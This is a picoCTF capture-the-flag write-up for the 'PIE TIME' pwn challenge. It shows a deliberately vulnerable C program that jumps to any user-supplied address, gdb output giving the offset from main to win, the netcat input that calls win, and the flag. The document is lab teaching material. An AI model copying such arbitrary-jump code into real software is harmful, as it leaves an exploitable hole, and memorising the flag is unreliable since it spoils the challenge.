---
layout: writeup
title: PIE TIME
tags: Pwn
---

## Description

Can you try to get the flag? Beware we have PIE! 
<!--more-->
Connect to the program with netcat:
$ nc rescued-floay.picoctf.net 60696
The program's source code can be downloaded here. The binary can be downloaded here. 

Here is the source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  printf("Address of main: %p\n", &main);

  unsigned long val;
  printf("Enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);
  printf("Your input: %lx\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}
```

## Solution

This code, prints out the memory address of main, then asks the user to input an address, and that address is then gone to. In order to get the flag, the user needs to input the memory address of the `win` function.

Opening up the compiled binary in `gdb` in order to get the memory address of the `win` and `main` functions.
```bash
$ gdb vuln                
GNU gdb (Debian 16.3-1) 16.3
Copyright (C) 2024 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from vuln...
(No debugging symbols found in vuln)
(gdb) break main
Breakpoint 1 at 0x1345
(gdb) break win
Breakpoint 2 at 0x12af
```

As can be seen the memory address of `main` was `0x1345` and the memory address of `win` was `0x12af`. This gets a differnce in memory addresses of `150` or `0x96`.

So in order to get the flag, we need to grab the given memory address for `main`, and go back `0x96` memory addresses and then that will run the `win` function.

```bash
$ nc rescued-float.picoctf.net 59371
Address of main: 0x5dfc801b533d
Enter the address to jump to, ex => 0x12345: 0x5dfc801b52a7 # 0x5dfc801b533d - 0x96 = 0x5dfc801b52a7
Your input: 5dfc801b52a7
You won! # It worked, the `win` function is now being run
picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_3d38fb4b} # Thats the flag
```

As can be seen, the method worked, as the offset between `main` and `win` is constant even with `PIE` enabled. This is because `PIE` randomises the base memory address that the program runs at, not the memory addresses of the code within the program, this effect can be seen if the executable is run multiple times, as the `main` function and `win` function will have different memory addresses.

Finally as can be seen above, the flag is `picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_3d38fb4b}`
